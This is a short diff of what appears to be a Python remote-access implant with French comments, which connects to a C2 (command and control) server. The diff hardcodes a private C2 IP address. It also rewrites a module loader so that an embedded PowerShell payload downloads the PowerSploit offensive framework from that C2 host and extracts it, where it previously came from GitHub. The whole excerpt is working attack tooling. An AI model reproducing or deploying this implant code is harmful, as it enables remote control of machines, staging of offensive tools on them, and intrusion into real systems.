@@ -35,7 +35,8 @@ receive = ''
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Adresse IP du serveur C2 (Command & Control)
-myip = "0.0.0.0" #Change IP
+myip = "10.20.10.104"
+#myip = "172.24.245.136"
 
 # ============================================
 # CHEMINS ET PERSISTENCE
@@ -435,8 +436,8 @@ def Load_Module(module_name):
         global powersploittodelete, powersplittoexecute
         powersploittodelete = current_path + "\\PowerSploit"
         powersplittoexecute = current_path + "\\PowerSploit\\PowerSploit.psm1"
-        payload = """
-        $url = "https://github.com/PowerShellMafia/PowerSploit/archive/refs/tags/v3.0.0.zip"
+        payload = f"""
+        $url = "http://{myip}/download/PowerSploit.zip"
         $destination = "$(get-location)/PowerSploit.zip"
         Invoke-WebRequest -Uri $url -OutFile $destination
         Expand-Archive -Path $destination -DestinationPath "$(get-location)/PowerSploit"
